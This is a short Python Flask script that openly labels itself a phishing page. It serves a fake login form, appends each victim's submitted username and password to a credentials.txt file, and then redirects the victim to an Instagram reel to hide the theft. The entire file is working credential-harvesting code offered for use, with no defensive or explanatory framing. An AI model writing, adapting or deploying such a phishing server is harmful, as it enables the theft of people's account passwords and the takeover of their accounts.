from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# Route for the phishing page
@app.route('/')
def phishing_page():
    return render_template('login.html')

# Route to handle deep link
@app.route('/short-url', methods=['GET', 'POST'])
def short_url():
    if request.method == 'POST':
        # Save credentials to a file
        with open('credentials.txt', 'a') as f:
            f.write(f'Username: {request.form["username"]}, Password: {request.form["password"]}\n')
        # Redirect to Instagram after saving credentials
        return redirect('https://www.instagram.com/reel/DdJyDTChRSi/')
    return render_template('login.html')

if __name__ == '__main__':
    app.run(debug=True)
